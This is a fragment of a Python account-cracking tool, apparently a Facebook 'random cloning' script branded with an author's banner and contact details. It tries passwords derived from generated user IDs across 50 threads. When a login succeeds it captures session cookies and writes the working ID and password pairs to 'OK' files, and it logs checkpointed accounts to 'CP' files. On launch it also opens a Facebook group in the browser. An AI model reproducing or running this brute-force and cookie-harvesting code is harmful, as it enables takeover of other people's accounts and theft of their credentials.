...
ha = current.day
today = date.today()
os.system('xdg-open https://facebook.com/groups/ITS.DEVIL.08/')
logo =("""   
   _____ __  ______ _       ______  ____  ____ 
  / ___// / / / __ \ |     / / __ \/ __ \/ __ )
  \__ \/ /_/ / / / / | /| / / /_/ / / / / __  |
 ___/ / __  / /_/ /| |/ |/ / _, _/ /_/ / /_/ / 
/____/_/ /_/\____/ |__/|__/_/ |_|\____/_____/  
\x1b[1;92m┏─────────────────────────────────────────┓
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m AUTHOR     \x1b[1;97m: \x1b[1;92mSHOWROB    
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m FACEBOOK   \x1b[1;97m: \x1b[1;92mSHOWROB CHOWDHURY                
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m WHATSAPP   \x1b[1;97m: \x1b[1;92m+8801739237334               
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m STATUS     \x1b[1;97m: \x1b[1;92mRANDOM CLONING 
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m TEAM       \x1b[1;97m: \x1b[1;92mDARK FORCE-71    
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m GITHUB     \x1b[1;97m: \x1b[1;92mSHOWROB-404         
\x1b[1;92m┗─────────────────────────────────────────┛    """)
loop = 0
oks = []
cps = []
...
def xxr():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m GIFT 4K MEMBAR DONE')
        jalan(' \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m×××××××××××××××××')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r \033[38;5;196m[\033[38;5;45mSHOWROB-OK💉\033[38;5;196m] \033[38;5;46m'+uid+'\033[38;5;196m | \033[38;5;46m' +ps+    '  \n\033[38;5;196m[\033[0;93m [\033[38;5;46mCOOKIE-🤖\033[38;5;196m] = \033[38;5;195m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/showrob-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[SHOWROB-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/showrob-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x} [{xr}SHOWROB{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
